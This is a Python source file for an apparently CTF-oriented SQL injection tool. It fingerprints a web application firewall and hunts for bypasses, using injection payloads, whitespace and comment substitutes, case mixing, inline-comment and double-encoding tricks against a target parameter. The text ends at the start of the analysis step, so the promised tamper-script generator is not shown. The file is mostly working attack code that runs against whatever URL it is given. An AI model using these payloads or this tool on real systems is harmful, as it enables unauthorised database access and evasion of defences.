#!/usr/bin/env python3
"""
WAF 自动分析器 (waf_analyzer.py)
=================================
CTF SQL 注入 WAF 自动探测 + 绕过工具链:

1. 探测阶段  — 自动测试关键词/运算符/函数/注释/空白替代符是否被过滤
2. 分析阶段  — 识别 WAF 检测模式 (关键词单独 vs 关键词+空白)，判定绕过复杂度
3. 生成阶段  —
   - 简单/中等 WAF: 自动生成 sqlmap tamper 脚本
   - 复杂 WAF: 自动生成自定义 exploit 脚本骨架

使用方式:
  # 完整分析 + 生成
  python waf_analyzer.py -u "http://target/page?id=1" --param id

  # 仅分析不生成
  python waf_analyzer.py -u "http://target/page?id=1" --param id --analyze-only

  # 指定注入闭合方式
  python waf_analyzer.py -u "http://target/check.php?username=1&password=1" --param username --quote "'" --comment "#"

依赖: requests
"""

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    sys.exit(1)

# ============================================================
# 探测词表
# ============================================================

# SQL 关键词 (会被 WAF 检测的)
SQL_KEYWORDS = [
    # 查询
    "union", "select", "from", "where", "limit", "order", "by",
    "group", "having", "into", "insert", "update", "delete",
    "drop", "create", "alter", "rename", "truncate",
    # 子句
    "distinct", "all", "any", "exists", "between", "in", "like",
    "regexp", "is", "as", "and", "or", "not",
    # 函数关键词
    "if", "case", "when", "then", "else", "end",
    "sleep", "benchmark", "waitfor", "delay",
    # 高级
    "handler", "outfile", "load_file", "join", "natural",
    "using", "prepare", "execute", "deallocate",
    "concat", "group_concat", "count", "floor", "rand",
    "extractvalue", "updatexml", "exp",
]

# SQL 运算符
SQL_OPERATORS = [
    # 比较
    "=", ">", "<", "!=", "<>", ">=", "<=",
    # 逻辑
    "and", "or", "not", "&&", "||", "!",
    # 算术
    "+", "-", "*", "/", "%", "mod", "div",
    # 位运算
    "&", "|", "^", "~", "<<", ">>",
    # 其他
    "between", "in", "like", "regexp",
]

# SQL 函数 (单参数/多参数分别测试)
SQL_FUNCTIONS = [
    # 字符串
    "substr", "substring", "mid", "left", "right",
    "ascii", "ord", "char", "hex", "bin", "unhex",
    "concat", "group_concat", "length", "char_length",
    "replace", "trim", "ltrim", "rtrim", "reverse",
    "upper", "lower", "lpad", "rpad", "elt", "field",
    # 数学
    "abs", "ceil", "floor", "round", "rand", "mod",
    "greatest", "least", "strcmp", "locate", "instr",
    "position",
    # 类型转换
    "cast", "convert", "binary",
    # 信息
    "database", "schema", "version", "user", "current_user",
    "connection_id", "last_insert_id",
    # 注入
    "sleep", "benchmark", "if", "case",
    "updatexml", "extractvalue", "floor",
    "count", "exp", "ln", "log", "log10", "pow", "power",
    # 编码
    "encode", "decode", "compress", "uncompress",
    "to_base64", "from_base64",
    # 系统
    "load_file", "into", "outfile", "dumpfile",
    # JSON (MySQL 5.7+)
    "json_extract", "json_unquote",
]

# 注释符
SQL_COMMENTS = [
    ("-- ", "dash-dash-space"),
    ("--", "dash-dash"),
    ("#", "hash"),
    ("/* */", "block-comment"),
    ("/**/", "empty-block-comment"),
    (";--", "semi-dash-dash"),
]

# 空白替代符 (在 SQL 中可用作空格的字符)
WHITESPACE_SUBS = [
    ("%0a", "LF (\\n)"),
    ("%0d", "CR (\\r)"),
    ("%09", "TAB"),
    ("%0b", "VT (vertical tab)"),
    ("%0c", "FF (form feed)"),
    ("%a0", "NBSP"),
    ("/**/", "inline-comment"),
    ("(", "paren (select(  /  from()"),
]

# ============================================================
# 探测引擎
# ============================================================

class WAFProbe:
    """
    WAF 探测引擎: 向目标发送探测 payload, 根据 WAF 响应判断过滤情况
    """

    def __init__(self, url, param, method='GET', quote="auto",
                 comment="auto", data=None, cookies=None,
                 waf_mark=None, success_mark=None, error_mark=None,
                 timeout=15, proxy=None, content_type="form"):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.quote = quote          # 闭合引号: ' 或 " 或空, "auto" 时自动检测
        self.comment = comment      # 注释符: # 或 --, "auto" 时自动检测
        self.data = data or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.proxy = proxy
        self.content_type = content_type  # "form" 或 "json", 影响 POST body 编码方式
        self.session = requests.Session()

        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36'
        })

        # 如果 content_type 为 json, 设置请求头
        if self.content_type == "json":
            self.session.headers.update({
                'Content-Type': 'application/json',
            })

        # WAF 响应特征 (自动检测 + 手动指定)
        self.waf_mark = waf_mark      # WAF 拦截标记文本
        self.success_mark = success_mark  # 正常成功标记
        self.error_mark = error_mark      # SQL 错误标记

        # 基准响应缓存
        self._baseline = None
        self._baseline_blocked = None
        self._baseline_len = 0  # 基准响应长度, 用于自适应阈值

        # 动态空白替代符: 默认 %0a, probe_whitespace 完成后更新为第一个可用的
        self.ws_sub = "%0a"

        # 探测结果存储 (供新增绕过探测方法使用)
        self.results = {
            "case_bypass": {},          # 大小写混淆绕过: keyword -> "pass/blocked"
            "inline_comment_bypass": {},  # 内联注释绕过: keyword -> "pass/blocked"
            "double_encode_bypass": {},   # 双重编码绕过: "pass/blocked"
        }

        # 自动检测闭合方式 (quote="auto" 时)
        if self.quote == "auto":
            detected_quote = self.auto_detect_quote()
            print(f"  [自动检测] 闭合方式: {repr(detected_quote)}")
            self.quote = detected_quote

        # 自动检测注释符 (comment="auto" 时)
        if self.comment == "auto":
            detected_comment = self.auto_detect_comment()
            print(f"  [自动检测] 注释符: {repr(detected_comment)}")
            self.comment = detected_comment

    # ---- 自动检测: 闭合方式 ----

    def auto_detect_quote(self):
        """
        自动检测 SQL 注入闭合方式
        依次测试: 1', 1", 1), 1)), 1'), 1"), 1 (数字型)
        根据 SQL 错误响应判断哪种闭合方式产生了语法错误
        对于数字型: 发送 1 AND 1=1 vs 1 AND 1=2 观察差异
        返回最佳闭合方式字符串
        """
        # 候选闭合方式: (后缀, 显示名)
        candidates = [
            ("'", "单引号"),
            ('"', "双引号"),
            (")", "单括号"),
            ("))", "双括号"),
            ("')", "单引号+括号"),
            ('")', "双引号+括号"),
            ("", "数字型"),
        ]

        print("  [自动检测] 正在检测闭合方式...")

        for suffix, name in candidates:
            # 构造 payload: 1[quote] — 故意不闭合, 让 SQL 产生语法错误
            # 如果该闭合方式是正确的, 则 1' 会在原始 SQL 中产生未闭合引号的语法错误
            # 如果闭合方式不正确, 则响应可能正常或被 WAF 拦截, 但不会产生语法错误
            test_payload = f"1{suffix}"
            text, status_code = self.send(test_payload)
            result = self.classify(text, status_code)

            if result == "error":
                # 产生了 SQL 语法错误 → 说明闭合方式可能正确 (引号/括号干扰了 SQL 语法)
                # 进一步确认: 用闭合方式 + 注释符构造合法语句, 应该不再报错
                confirm_payload = f"1{suffix}{self.comment if self.comment != 'auto' else '#'}1"
                confirm_text, confirm_status = self.send(confirm_payload)
                confirm_result = self.classify(confirm_text, confirm_status)
                if confirm_result != "error":
                    # 闭合 + 注释后不再报错 → 确认此闭合方式
                    print(f"    测试 {repr(suffix):8s} ({name}): error → 闭合+注释后 {confirm_result} → 确认")
                    return suffix
                else:
                    print(f"    测试 {repr(suffix):8s} ({name}): error → 闭合+注释后仍 error → 跳过")
            else:
                # 对于数字型 (suffix=""): 需要额外用布尔差异确认
                if suffix == "":
                    # 测试 1 AND 1=1 vs 1 AND 1=2
                    true_text, true_status = self.send("1 AND 1=1")
                    false_text, false_status = self.send("1 AND 1=2")
                    true_result = self.classify(true_text, true_status)
                    false_result = self.classify(false_text, false_status)
                    if true_result == "success" and false_result == "wrong":
                        print(f"    测试 {repr(suffix):8s} ({name}): 布尔差异确认 → 数字型")
                        return suffix
                    else:
                        print(f"    测试 {repr(suffix):8s} ({name}): {result} → 无布尔差异 → 跳过")
                else:
                    print(f"    测试 {repr(suffix):8s} ({name}): {result} → 跳过")

        # 所有候选都不匹配, 默认使用单引号
        print("    [!] 未能自动检测闭合方式, 默认使用单引号")
        return "'"

    # ---- 自动检测: 注释符 ----

    def auto_detect_comment(self):
        """
        自动检测可用的注释符
        依次测试: #, -- , -- -, /**/, ;%00
        发送 1[quote][comment]xxx 形式, 观察是否注释成功 (无 SQL 错误且不 blocked)
        返回第一个可用的注释符
        """
        comment_candidates = [
            ("#", "hash"),
            ("-- ", "dash-dash-space"),
            ("-- -", "dash-dash-dash"),
            ("/**/", "block-comment"),
            (";%00", "semi-null"),
        ]

        # 确保已有闭合方式
        current_quote = self.quote if self.quote != "auto" else "'"

        print("  [自动检测] 正在检测注释符...")

        for comment_str, comment_name in comment_candidates:
            # 构造 payload: 1[quote][comment]xxx
            # 如果注释符有效: 注释掉后面的垃圾内容 → SQL 不报错
            # 如果注释符无效: xxx 被解析为 SQL → 语法错误
            test_payload = f"1{current_quote}{comment_str}xxxx"
            text, status_code = self.send(test_payload)
            result = self.classify(text, status_code)

            if result not in ("blocked", "error"):
                print(f"    测试 {comment_name:20s} ({repr(comment_str)}): {result} → 可用")
                return comment_str
            else:
                print(f"    测试 {comment_name:20s} ({repr(comment_str)}): {result} → 不可用")

        # 所有候选都不可用, 默认使用 #
        print("    [!] 未能自动检测注释符, 默认使用 #")
        return "#"

    def _encode_payload(self, payload):
        """
        手动 URL 编码: 只编码必要字符, 避免二次编码
        ' -> %27, # -> %23, 空格 -> self.ws_sub (动态空白替代符, 默认 %0a)
        """
        encoded = ""
        for ch in payload:
            if ch == "'":
                encoded += "%27"
            elif ch == "#":
                encoded += "%23"
            elif ch == " ":
                encoded += self.ws_sub
            else:
                encoded += ch
        return encoded

    def send(self, payload):
        """
        发送 payload, 返回 (响应文本, HTTP 状态码)
        payload 是原始 SQL 注入串 (未编码), 内部自动编码
        """
        encoded = self._encode_payload(payload)

        if self.method == 'GET':
            # 手动拼接 URL, 不用 params= 避免二次编码
            url = self._build_url(encoded)
            try:
                resp = self.session.get(url, cookies=self.cookies,
                                        timeout=self.timeout, allow_redirects=False)
                return resp.text, resp.status_code
            except Exception as e:
                return f"__REQUEST_ERROR__:{e}", 0
        else:
            data = dict(self.data)
            data[self.param] = payload  # POST 不做 URL 编码
            try:
                if self.content_type == "json" and isinstance(data, dict):
                    # JSON body POST: 用 json= 参数自动序列化
                    resp = self.session.post(self.url, json=data,
                                             cookies=self.cookies,
                                             timeout=self.timeout,
                                             allow_redirects=False)
                else:
                    # 表单 POST: 用 data= 参数
                    resp = self.session.post(self.url, data=data,
                                             cookies=self.cookies,
                                             timeout=self.timeout,
                                             allow_redirects=False)
                return resp.text, resp.status_code
            except Exception as e:
                return f"__REQUEST_ERROR__:{e}", 0

    def _build_url(self, encoded_payload):
        """
        构建注入 URL, 保留其他 GET 参数
        """
        from urllib.parse import urlparse, parse_qs, urlencode

        parsed = urlparse(self.url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # 替换注入参数
        params[self.param] = [encoded_payload]

        # 重建 query string (不编码, 保持原样)
        query_parts = []
        for k, v_list in params.items():
            for v in v_list:
                query_parts.append(f"{k}={v}")

        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"

    # ---- 响应判断 ----

    def classify(self, text, status_code=200):
        """
        分类响应: 'blocked' / 'success' / 'wrong' / 'error' / 'unknown'

        增强:
        - HTTP 状态码感知: 403→blocked, 302→blocked(重定向拦截), 500→error
        - 长度阈值自适应: 基于基准响应长度的 1.5 倍 (替代硬编码 2000)
        - 长度差自适应: 基于基准响应长度的 0.2 倍 (替代硬编码 50)
        """
        if "__REQUEST_ERROR__" in text:
            return "error"

        # HTTP 状态码感知
        if status_code == 403:
            return "blocked"
        if status_code in (301, 302, 303, 307, 308):
            # 重定向拦截: WAF 经常用 302 跳转到警告页
            return "blocked"
        if status_code == 500:
            return "error"

        # WAF 拦截: 优先检测
        if self.waf_mark and self.waf_mark in text:
            return "blocked"

        # 自适应长度阈值: 基准响应长度的 1.5 倍
        waf_len_threshold = self._baseline_len * 1.5 if self._baseline_len > 0 else 2000

        # 自动检测 WAF 标记 (常见中文 WAF 提示)
        waf_patterns = [
            "逮住", "hacker", "拦截", "非法", "forbidden",
            "blocked", "waf", "防火墙", "攻击", "注入",
            "security", "reject", "过滤", "违规",
        ]
        for pat in waf_patterns:
            if pat.lower() in text.lower():
                # 进一步确认: WAF 页面长度低于自适应阈值
                if len(text) < waf_len_threshold:
                    self.waf_mark = pat
                    return "blocked"

        # SQL 错误
        sql_error_patterns = [
            "SQL syntax", "mysql_", "MariaDB", "XPATH syntax error",
            "Subquery returns", "Unknown column", "doesn't exist",
            "Duplicate entry", "Out of range", "Data truncated",
        ]
        for pat in sql_error_patterns:
            if pat in text:
                return "error"

        # 成功标记
        if self.success_mark and self.success_mark in text:
            return "success"

        # 与基准比较
        if self._baseline is None:
            self._baseline = text
            self._baseline_len = len(text)

        if text == self._baseline:
            return "success"

        # 自适应长度差阈值: 基准响应长度的 0.2 倍
        len_diff_threshold = max(self._baseline_len * 0.2, 50) if self._baseline_len > 0 else 50

        # 长度接近基准 = 正常响应
        if self._baseline and abs(len(text) - len(self._baseline)) < len_diff_threshold:
            return "success"

        # 内容变化 = 可能是 wrong (查询无结果)
        return "wrong"

    # ---- 探测方法 ----

    def probe_keyword(self, keyword):
        """
        测试关键词是否被过滤 (单独使用, 不加空格)
        payload: 'keyword#
        """
        payload = f"{self.quote}{keyword}{self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_keyword_with_space(self, keyword):
        """
        测试 关键词+空格 组合是否被过滤
        payload: 'keyword (#
        """
        payload = f"{self.quote}{keyword} ({self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_operator(self, op):
        """
        测试运算符是否被过滤
        payload: '1 op 1#
        """
        # 特殊处理: 逻辑运算符需要放在条件中
        if op in ("and", "or", "not"):
            payload = f"{self.quote}1 {op} 1{self.comment}"
        elif op in ("&&", "||"):
            payload = f"{self.quote}1{op}1{self.comment}"
        elif op == "!":
            payload = f"{self.quote}!1{self.comment}"
        elif op in ("between", "in", "like", "regexp"):
            payload = f"{self.quote}1 {op} (1){self.comment}"
        else:
            payload = f"{self.quote}1{op}1{self.comment}"

        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_function(self, func):
        """
        测试函数是否被过滤
        payload: 'func(1)#
        对于无参函数: 'func()#
        """
        no_arg_funcs = {"database", "schema", "version", "user",
                        "current_user", "connection_id", "last_insert_id"}
        if func in no_arg_funcs:
            payload = f"{self.quote}{func}(){self.comment}"
        elif func in ("sleep",):
            payload = f"{self.quote}{func}(0){self.comment}"  # sleep(0) 不延迟
        elif func in ("benchmark",):
            payload = f"{self.quote}{func}(1,1){self.comment}"
        elif func in ("updatexml", "extractvalue"):
            payload = f"{self.quote}{func}(1,1,1){self.comment}"
        elif func in ("if",):
            payload = f"{self.quote}{func}(1,1,1){self.comment}"
        elif func in ("case",):
            payload = f"{self.quote}{func} when 1 then 1 end{self.comment}"
        elif func in ("count", "floor", "rand", "exp", "abs", "ceil",
                       "round", "length", "ord", "ascii", "char", "hex",
                       "bin", "unhex", "reverse", "upper", "lower"):
            payload = f"{self.quote}{func}(1){self.comment}"
        elif func in ("concat", "group_concat", "locate", "instr",
                       "strcmp", "greatest", "least", "lpad", "rpad",
                       "elt", "field", "replace"):
            payload = f"{self.quote}{func}(1,1){self.comment}"
        elif func in ("substr", "substring", "mid", "left", "right"):
            payload = f"{self.quote}{func}(1,1){self.comment}"
        elif func in ("cast",):
            payload = f"{self.quote}{func}(1 as int){self.comment}"
        elif func in ("convert",):
            payload = f"{self.quote}{func}(1,int){self.comment}"
        elif func in ("load_file",):
            payload = f"{self.quote}{func}(0x2f){self.comment}"
        elif func in ("json_extract", "json_unquote"):
            payload = f"{self.quote}{func}(1,1){self.comment}"
        else:
            payload = f"{self.quote}{func}(1){self.comment}"

        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_comment(self, comment_str, comment_name):
        """
        测试注释符是否可用
        方法: 先用引号闭合 SQL 字符串, 再用注释符 + 垃圾内容
        payload: 1'comment_strxxxx  (注意引号在 1 后面, 闭合字符串)
        SQL: WHERE username='1'#xxxx' AND password='1'
        # 有效 → 注释掉后面的内容 → WHERE username='1' → 正常
        # 无效 → syntax error
        """
        payload = f"1{self.quote}{comment_str}xxxx"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        if result == "error":
            return "blocked"
        return result

    def probe_whitespace(self, ws_char, ws_name):
        """
        测试空白替代符是否可用 (用于 select 和 from 后)
        """
        # 测试: select%0a1 或 select(1) 等场景
        # 这里测试: 'select%0a1#  — 如果 select+空白 被拦截就是 blocked
        if ws_char == "(":
            # 括号绕过: select(1)
            payload = f"{self.quote}select(1){self.comment}"
        else:
            payload = f"{self.quote}select{ws_char}1{self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_from_bypass(self, ws_char):
        """
        测试 from+空白替代符 或 from( 绕过
        """
        if ws_char == "(":
            payload = f"{self.quote}select(1)from(information_schema.tables){self.comment}"
        else:
            payload = f"{self.quote}select(1)from{ws_char}information_schema.tables{self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_where_bypass(self, ws_char):
        """
        测试 where+空白替代符 或 where( 绕过
        """
        if ws_char == "(":
            payload = f"{self.quote}select(1)from(information_schema.tables)where(1){self.comment}"
        else:
            payload = f"{self.quote}select(1)from(information_schema.tables)where{ws_char}1{self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    def probe_limit_bypass(self, ws_char):
        """
        测试 limit+空白替代符 或 limit( 绕过
        """
        if ws_char == "(":
            payload = f"{self.quote}select(1)limit(1){self.comment}"
        else:
            payload = f"{self.quote}select(1)limit{ws_char}1{self.comment}"
        text, status_code = self.send(payload)
        result = self.classify(text, status_code)
        return result

    # ---- 绕过方式探测 (新增) ----

    def probe_case_bypass(self):
        """
        测试大小写混淆是否能绕过 WAF
        对关键词 (如 select) 和函数 (如 database) 分别测试:
        - 小写 (原始): 被拦截
        - 大小写混合 (如 SeLeCt): 不被拦截 → 大小写混淆绕过有效
        结果存入 self.results["case_bypass"]
        返回: dict {"keyword": "pass/blocked", "function": "pass/blocked"}
        """
        print("  [绕过探测] 大小写混淆绕过...")

        # 测试关键词大小写混淆: select → SeLeCt
        mixed_keyword = "SeLeCt"
        payload_kw_lower = f"{self.quote}select(1){self.comment}"
        payload_kw_mixed = f"{self.quote}{mixed_keyword}(1){self.comment}"

        text_lower, status_lower = self.send(payload_kw_lower)
        text_mixed, status_mixed = self.send(payload_kw_mixed)

        kw_lower_result = self.classify(text_lower, status_lower)
        kw_mixed_result = self.classify(text_mixed, status_mixed)

        kw_pass = "pass" if kw_mixed_result not in ("blocked",) else "blocked"
        self.results["case_bypass"]["keyword"] = kw_pass
        print(f"    关键词 select(小写)={kw_lower_result}, SeLeCt(混合)={kw_mixed_result} → {kw_pass}")

        # 测试函数大小写混淆: database → DaTaBaSe
        mixed_func = "DaTaBaSe"
        payload_func_lower = f"{self.quote}database(){self.comment}"
        payload_func_mixed = f"{self.quote}{mixed_func}(){self.comment}"

        text_fl, status_fl = self.send(payload_func_lower)
        text_fm, status_fm = self.send(payload_func_mixed)

        func_lower_result = self.classify(text_fl, status_fl)
        func_mixed_result = self.classify(text_fm, status_fm)

        func_pass = "pass" if func_mixed_result not in ("blocked",) else "blocked"
        self.results["case_bypass"]["function"] = func_pass
        print(f"    函数 database(小写)={func_lower_result}, DaTaBaSe(混合)={func_mixed_result} → {func_pass}")

        return {"keyword": kw_pass, "function": func_pass}

    def probe_inline_comment_bypass(self):
        """
        测试内联注释 /*!50000select*/ 是否能绕过 WAF
        对关键词 (如 select) 和函数 (如 database) 分别测试
        结果存入 self.results["inline_comment_bypass"]
        返回: dict {"keyword": "pass/blocked", "function": "pass/blocked"}
        """
        print("  [绕过探测] 内联注释绕过...")

        # 测试关键词: /*!50000select*/
        payload_kw = f"{self.quote}/*!50000select*/(1){self.comment}"
        text_kw, status_kw = self.send(payload_kw)
        kw_result = self.classify(text_kw, status_kw)
        kw_pass = "pass" if kw_result not in ("blocked",) else "blocked"
        self.results["inline_comment_bypass"]["keyword"] = kw_pass
        print(f"    关键词 /*!50000select*/ → {kw_result} → {kw_pass}")

        # 测试函数: /*!50000database*/()
        payload_func = f"{self.quote}/*!50000database*/(){self.comment}"
        text_func, status_func = self.send(payload_func)
        func_result = self.classify(text_func, status_func)
        func_pass = "pass" if func_result not in ("blocked",) else "blocked"
        self.results["inline_comment_bypass"]["function"] = func_pass
        print(f"    函数 /*!50000database*/() → {func_result} → {func_pass}")

        return {"keyword": kw_pass, "function": func_pass}

    def probe_double_encode_bypass(self):
        """
        测试双重编码 (%2527 → %27 → ') 是否能绕过 WAF
        发送含 %2527 的 payload, 如果 WAF 解码一次后认为是 %27(引号) 则可能拦截;
        如果 WAF 不做二次解码, 则 %2527 透传到后端, 后端再解码为引号
        结果存入 self.results["double_encode_bypass"]
        返回: "pass" / "blocked"
        """
        print("  [绕过探测] 双重编码绕过...")

        # 直接构造含双重编码的 payload (不走 _encode_payload, 手动构建)
        # 测试: 1%2527 OR 1=1--  (双重编码的引号)
        # 注意: 这里需要手动构建 URL, 因为 _encode_payload 会再次编码
        if self.method == 'GET':
            # 手动构建: 注入参数值含 %2527
            payload_raw = "1%2527 OR 1=1-- "
            # 不走 _encode_payload, 直接手动拼接 URL
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[self.param] = [payload_raw]
            query_parts = []
            for k, v_list in params.items():
                for v in v_list:
                    query_parts.append(f"{k}={v}")
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(query_parts)}"
            try:
                resp = self.session.get(url, cookies=self.cookies,
                                        timeout=self.timeout, allow_redirects=False)
                text, status_code = resp.text, resp.status_code
            except Exception as e:
                text, status_code = f"__REQUEST_ERROR__:{e}", 0
        else:
            # POST 模式: 在 body 中发送双重编码
            data = dict(self.data)
            data[self.param] = "1%2527 OR 1=1-- "
            try:
                if self.content_type == "json" and isinstance(data, dict):
                    resp = self.session.post(self.url, json=data,
                                             cookies=self.cookies,
                                             timeout=self.timeout,
                                             allow_redirects=False)
                else:
                    resp = self.session.post(self.url, data=data,
                                             cookies=self.cookies,
                                             timeout=self.timeout,
                                             allow_redirects=False)
                text, status_code = resp.text, resp.status_code
            except Exception as e:
                text, status_code = f"__REQUEST_ERROR__:{e}", 0

        result = self.classify(text, status_code)
        de_pass = "pass" if result not in ("blocked",) else "blocked"
        self.results["double_encode_bypass"] = de_pass
        print(f"    双重编码 %2527 → {result} → {de_pass}")

        return de_pass

    def update_ws_sub(self, whitespace_results):
        """
        根据 probe_whitespace 探测结果更新 self.ws_sub
        whitespace_results: dict {ws_name: "pass/blocked", ...}
        选择第一个可用的空白替代符; 如果都不可用, 保持默认 %0a
        """
        ws_map = {
            "LF": "%0a", "CR": "%0d", "TAB": "%09",
            "VT": "%0b", "FF": "%0c", "NBSP": "%a0",
        }
        for ws_name, result in whitespace_results.items():
            if result == "pass" and ws_name in ws_map:
                self.ws_sub = ws_map[ws_name]
                return
        # 所有空白替代符都不可用, 保持默认 %0a
        self.ws_sub = "%0a"


# ============================================================
# 分析引擎: 汇总探测结果, 识别 WAF 模式, 判定复杂度
# ============================================================

class WAFAnalysis:
    """
    WAF 分析结果: 存储探测数据, 识别 WAF 模式, 判定绕过复杂度
    """

    def __init__(self, probe: WAFProbe):
        self.probe = probe
        self.results = {
            "keywords": {},         # keyword -> {"alone": "pass/blocked", "with_space": "pass/blocked"}
            "operators": {},        # operator -> "pass/blocked"
            "functions": {},        # function -> "pass/blocked"
            "comments": {},         # comment -> "pass/blocked"
            "whitespace": {},       # ws_char -> "pass/blocked"
            "bypass_select": {},    # ws_char -> "pass/blocked" (select 绕过)
            "bypass_from": {},      # ws_char -> "pass/blocked" (from 绕过)
            "bypass_where": {},     # ws_char -> "pass/blocked" (where 绕过)
            "bypass_limit": {},     # ws_char -> "pass/blocked" (limit 绕过)
            "case_bypass": {},         # 大小写混淆绕过: {"keyword": "pass/blocked", "function": "pass/blocked"}
            "inline_comment_bypass": {},  # 内联注释绕过: {"keyword": "pass/blocked", "function": "pass/blocked"}
            "double_encode_bypass": "",   # 双重编码绕过: "pass/blocked"
        }
        self.waf_pattern = None     # "none" / "keyword_only" / "keyword_plus_space" / "mixed"
        self.complexity = None      # "simple" / "medium" / "complex"
        self.available = {          # 可用工具箱
            "logical_ops": [],      # 可用的逻辑运算符
            "compare_funcs": [],    # 可用的比较函数 (替代 =, >, <)
            "extract_funcs": [],    # 可用的字符提取函数组合
            "inject_funcs": [],     # 可用的注入函数 (报错/盲注)
            "info_funcs": [],       # 可用的信息函数
            "string_funcs": [],     # 可用的字符串函数
            "comments": [],         # 可用的注释符
            "bypasses": {},         # 可用的绕过方式
        }

    def run(self, verbose=True):
        """
        执行完整探测流程
        """
        if verbose:
            print("=" * 70)
            print("WAF 自动探测引擎")
            print("=" * 70)

        # 0. 基准响应
        if verbose:
            print("\n[0] 获取基准响应...")
        baseline_payload = f"{self.probe.quote}1{self.probe.comment}"
        text, status_code = self.probe.send(baseline_payload)
        self.probe._baseline = text
        self.probe._baseline_len = len(text)
        baseline_class = self.probe.classify(text, status_code)
        if verbose:
            print(f"  基准 payload: {baseline_payload}")
            print(f"  基准响应分类: {baseline_class}")
            if baseline_class == "blocked":
                print("  [!] 基准 payload 就被拦截, 请检查闭合方式/注释符")
            print(f"  响应长度: {len(text)}")

        # 0.5 绕过方式探测 (大小写混淆 / 内联注释 / 双重编码)
        if verbose:
            print(f"\n[0.5] 绕过方式探测...")
        self.probe.probe_case_bypass()
        self.probe.probe_inline_comment_bypass()
        self.probe.probe_double_encode_bypass()

        # 1. 关键词探测 (单独 + 带空格)
        if verbose:
            print(f"\n[1] 关键词探测 ({len(SQL_KEYWORDS)} 个)...")
        for kw in SQL_KEYWORDS:
            alone = self.probe.probe_keyword(kw)
            with_space = self.probe.probe_keyword_with_space(kw)
            self.results["keywords"][kw] = {
                "alone": "pass" if alone not in ("blocked",) else "blocked",
                "with_space": "pass" if with_space not in ("blocked",) else "blocked",
            }
            if verbose:
                alone_ok = "PASS" if alone != "blocked" else "BLOCK"
                ws_ok = "PASS" if with_space != "blocked" else "BLOCK"
                status = "" if (alone != "blocked" and with_space != "blocked") else " ←"
                print(f"  {kw:20s}  alone={alone_ok:5s}  +space={ws_ok:5s}{status}")

        # 2. 运算符探测
        if verbose:
            print(f"\n[2] 运算符探测 ({len(SQL_OPERATORS)} 个)...")
        for op in SQL_OPERATORS:
            result = self.probe.probe_operator(op)
            self.results["operators"][op] = "pass" if result != "blocked" else "blocked"
            if verbose:
                ok = "PASS" if result != "blocked" else "BLOCK"
                status = "" if result != "blocked" else " ←"
                print(f"  {op:15s}  {ok}{status}")

        # 3. 函数探测
        if verbose:
            print(f"\n[3] 函数探测 ({len(SQL_FUNCTIONS)} 个)...")
        for func in SQL_FUNCTIONS:
            result = self.probe.probe_function(func)
            self.results["functions"][func] = "pass" if result != "blocked" else "blocked"
            if verbose:
                ok = "PASS" if result != "blocked" else "BLOCK"
                status = "" if result != "blocked" else " ←"
                print(f"  {func:20s}  {ok}{status}")

        # 4. 注释符探测
        if verbose:
            print(f"\n[4] 注释符探测 ({len(SQL_COMMENTS)} 个)...")
        for comment_str, comment_name in SQL_COMMENTS:
            result = self.probe.probe_comment(comment_str, comment_name)
            self.results["comments"][comment_name] = "pass" if result not in ("blocked", "error") else "blocked"
            if verbose:
                ok = "PASS" if result not in ("blocked", "error") else "BLOCK"
                status = "" if result not in ("blocked", "error") else " ←"
                print(f"  {comment_name:25s}  {ok}{status}")

        # 5. 空白替代符 + 关键词绕过探测
        if verbose:
            print(f"\n[5] 空白替代符 & 关键词绕过探测...")
        bypass_chars = [
            ("%0a", "LF"),
            ("%0d", "CR"),
            ("%09", "TAB"),
            ("%0b", "VT"),
            ("%0c", "FF"),
            ("%a0", "NBSP"),
            ("(", "paren"),
        ]
        for ws_char, ws_name in bypass_chars:
            # select 绕过
            sel_result = self.probe.probe_whitespace(ws_char, ws_name)
            self.results["bypass_select"][ws_name] = "pass" if sel_result != "blocked" else "blocked"

            # from 绕过
            from_result = self.probe.probe_from_bypass(ws_char)
            self.results["bypass_from"][ws_name] = "pass" if from_result != "blocked" else "blocked"

            # where 绕过
            where_result = self.probe.probe_where_bypass(ws_char)
            self.results["bypass_where"][ws_name] = "pass" if where_result != "blocked" else "blocked"

            # limit 绕过
            limit_result = self.probe.probe_limit_bypass(ws_char)
            self.results["bypass_limit"][ws_name] = "pass" if limit_result != "blocked" else "blocked"

            if verbose:
                sel_ok = "PASS" if sel_result != "blocked" else "BLOCK"
                from_ok = "PASS" if from_result != "blocked" else "BLOCK"
                where_ok = "PASS" if where_result != "blocked" else "BLOCK"
                limit_ok = "PASS" if limit_result != "blocked" else "BLOCK"
                print(f"  {ws_name:8s} ({ws_char:5s})  select={sel_ok:5s}  from={from_ok:5s}  where={where_ok:5s}  limit={limit_ok:5s}")

        # 5.5 根据空白替代符探测结果更新 ws_sub
        self.probe.update_ws_sub(self.results["bypass_select"])

        # 5.6 同步 WAFProbe 绕过探测结果到 WAFAnalysis.results
        self.results["case_bypass"] = self.probe.results.get("case_bypass", {})
        self.results["inline_comment_bypass"] = self.probe.results.get("inline_comment_bypass", {})
        self.results["double_encode_bypass"] = self.probe.results.get("double_encode_bypass", "")

        # 6. 分析 WAF 模式
        if verbose:
            print(f"\n[6] WAF 模式分析...")
